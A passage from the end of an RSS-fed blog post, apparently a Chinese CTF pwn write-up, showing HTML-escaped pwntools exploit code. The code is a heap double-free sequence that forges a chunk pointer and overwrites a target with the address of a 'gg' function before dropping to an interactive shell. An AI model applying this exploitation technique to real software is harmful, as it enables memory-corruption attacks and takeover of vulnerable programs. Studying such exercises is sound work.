&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0x60203a&lt;/span&gt;))//这个需要填入覆盖地址了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;bbb&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;bbb&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;\x40\x00\x00\x00\x00\x00&amp;quot;&lt;/span&gt;+p64(ELF.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;gg&amp;#x27;&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#io.recv(1024)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;













 ]]></description>
        </item>
    </channel>
</rss>
